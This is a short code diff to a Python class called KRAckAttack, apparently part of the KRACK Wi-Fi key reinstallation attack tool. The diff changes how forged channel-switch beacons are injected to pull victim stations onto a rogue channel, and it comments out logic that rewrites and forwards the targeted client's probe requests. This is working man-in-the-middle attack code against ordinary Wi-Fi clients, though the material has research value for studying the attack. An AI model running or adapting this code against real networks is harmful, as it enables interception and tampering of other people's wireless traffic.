@@ -257,10 +257,10 @@ class KRAckAttack():
 			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
 			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(beacon, newchannel, 2)
-			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
+			self.sock_real.send(csabeacon, True, self.netconfig.real_channel)
 
 			csabeacon = append_csa(beacon, newchannel, 1)
-			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
+			self.sock_real.send(csabeacon, True, self.netconfig.real_channel)
 
 		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
 
@@ -479,11 +479,11 @@ class KRAckAttack():
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				if (p.haslayer(Dot11ProbeReq)):
-					ds_parameter_set_index = p.payload.fields_desc[2].find("DSset")
-					ds_parameter_set_start = p.payload.fields_desc[2].fmt.find("B", ds_parameter_set_index)
-					p.payload.load[ds_parameter_set_start + 1] = self.netconfig.real_channel
-					self.sock_real.send(p, True, self.netconfig.real_channel)
+				# if (p.haslayer(Dot11ProbeReq)):
+				# 	ds_parameter_set_index = p.payload.fields_desc[2].find("DSset")
+				# 	ds_parameter_set_start = p.payload.fields_desc[2].fmt.find("B", ds_parameter_set_index)
+				# 	p.payload.load[ds_parameter_set_start + 1] = self.netconfig.real_channel
+				# 	self.sock_real.send(p, True, self.netconfig.real_channel)
 				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
